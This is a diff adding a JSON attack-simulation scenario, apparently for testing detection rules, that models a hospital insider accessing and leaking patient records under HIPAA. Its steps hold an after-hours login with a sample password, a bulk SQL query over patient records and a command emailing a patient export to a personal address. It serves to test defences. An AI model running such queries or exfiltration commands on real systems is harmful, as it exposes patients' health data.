@@ -1,0 +1,34 @@
+{
+  "id": "hipaa-insider-threat-001",
+  "name": "HIPAA Insider Threat — Unauthorized Patient Data Access",
+  "description": "Simulates a healthcare insider accessing patient records outside their care team scope — a HIPAA violation scenario.",
+  "mitre_phases": ["Collection", "Exfiltration"],
+  "expected_rules": [
+    "crucible-bulk-patient-access",
+    "crucible-after-hours-access",
+    "crucible-phi-export"
+  ],
+  "steps": [
+    {
+      "action": "after_hours_login",
+      "technique_id": "T1078",
+      "description": "Employee logs into EHR system at 2 AM outside normal hours.",
+      "path": "/login",
+      "payload": {"username": "nurse_chen", "password": "NursePass1"}
+    },
+    {
+      "action": "bulk_patient_query",
+      "technique_id": "T1005",
+      "description": "Employee queries 500+ patient records unrelated to their care assignments.",
+      "path": "/admin/simulate-command",
+      "payload": {"username": "nurse_chen", "command": "SELECT * FROM patient_records WHERE department != 'ICU' LIMIT 500"}
+    },
+    {
+      "action": "phi_export",
+      "technique_id": "T1048",
+      "description": "Employee exports PHI to personal email.",
+      "path": "/admin/simulate-command",
+      "payload": {"username": "nurse_chen", "command": "send_email --to personal@gmail.com --attach patient_export.csv"}
+    }
+  ]
+}
